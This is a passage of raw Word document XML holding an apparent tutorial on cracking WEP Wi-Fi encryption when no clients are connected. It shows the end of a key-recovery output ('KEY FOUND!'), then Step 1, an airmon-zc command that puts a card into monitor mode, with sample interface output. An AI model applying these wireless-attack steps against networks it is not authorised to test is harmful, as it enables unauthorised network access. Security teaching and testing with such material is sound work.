        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000C668B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  2    0</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="000C668B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>/  2</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="000C668B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">   56(  87) A6(  63) 15(  17) 02(  15) 6B(  15) E0(  15) AB(  13) 0E(  10) 17(  10) 27(  10) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58B97782" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="000C668B" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000C668B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  3    1</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="000C668B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>/  5</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="000C668B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">   78(  43) 1A(  20) 9B(  20) 4B(  17) 4A(  16) 2B(  15) 4D(  15) 58(  15) 6A(  15) 7C(  15) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E2AA56B" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="000C668B" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000C668B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2518E8FE" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="000C668B" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000C668B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                       KEY FOUND! </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="000C668B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>[ 12:34:56:78:90</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="000C668B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> ] </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47AF1A0F" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="000C668B" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000C668B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">      Probability: 100%</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="109ECC3E" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Tutorial: How to crack WEP with no wireless clients</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60A30F76" w14:textId="77777777" w:rsidR="00C926B8" w:rsidRDefault="00C926B8" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F6B5946" w14:textId="01FFAEB0" w:rsidR="004652D1" w:rsidRDefault="002B5D62" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Step 1</w:t>
      </w:r>
      <w:r w:rsidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> - Start the wireless interface in monitor mode on AP channel</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74F5AD78" w14:textId="77777777" w:rsidR="00C926B8"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Enter the following command to start the wireless card on channel 9 in monitor mode:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57D14A99" w14:textId="77777777" w:rsidR="00C926B8" w:rsidRDefault="00C926B8" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6C1DA8E0" w14:textId="16EE5A72" w:rsidR="004652D1" w:rsidRPr="002A56B4" w:rsidRDefault="00AF4B88" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airmon</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-zc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="004652D1" w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> start </w:t>
      </w:r>
      <w:r w:rsidR="00277615" w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wlan0</w:t>
      </w:r>
      <w:r w:rsidR="004652D1" w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="555DFE19" w14:textId="77777777" w:rsidR="00C926B8" w:rsidRDefault="00C926B8" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01977A8A" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="00B0296B">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The system will respond:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B44AA18" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00DC6CB9" w:rsidRDefault="004652D1" w:rsidP="00B0296B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Interface       Chipset         Driver</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="043E29C6" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00DC6CB9" w:rsidRDefault="004652D1" w:rsidP="00B0296B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FD541BE" w14:textId="05463DE2" w:rsidR="004652D1" w:rsidRPr="00DC6CB9" w:rsidRDefault="004652D1" w:rsidP="00B0296B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00277615" w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>wlan0</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">           Atheros         </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>madwifi-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1348100C" w14:textId="79CC7CE3" w:rsidR="004652D1" w:rsidRPr="00DC6CB9" w:rsidRDefault="004652D1" w:rsidP="00B0296B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00277615" w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>wlan0mon</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">            Atheros         </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>madwifi-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> VAP (parent: </w:t>
      </w:r>
      <w:r w:rsidR="00277615" w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>wlan0</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>) (monitor mode enabled)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E383275" w14:textId="77777777" w:rsidR="00DC6CB9" w:rsidRDefault="00DC6CB9" w:rsidP="00B0296B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F6D225E" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="00B0296B">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To confirm the interface is properly setup, enter “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>iwconfig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78CC56F2" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="00B0296B">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The system will respond:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B32FCAE" w14:textId="56D077D1" w:rsidR="004652D1" w:rsidRPr="008D1EBD" w:rsidRDefault="004652D1" w:rsidP="00B0296B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>lo</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        no wireless extensions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FF975FA" w14:textId="516855A2" w:rsidR="004652D1" w:rsidRPr="008D1EBD" w:rsidRDefault="004652D1" w:rsidP="00B0296B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>eth0</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      no wireless extensions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33FB840B" w14:textId="6525A798" w:rsidR="004652D1" w:rsidRPr="008D1EBD" w:rsidRDefault="004652D1" w:rsidP="00B0296B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00277615" w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>wlan0</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">     no wireless extensions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="530570C3" w14:textId="77892EB1" w:rsidR="004652D1" w:rsidRPr="008D1EBD" w:rsidRDefault="004652D1" w:rsidP="00B0296B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00277615" w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>wlan0mon</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      IEEE 802.11g  ESSID:""  Nickname:""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12C3CFB8" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="008D1EBD" w:rsidRDefault="004652D1" w:rsidP="00B0296B">
      <w:pPr>
        <w:widowControl w:val="0"/>
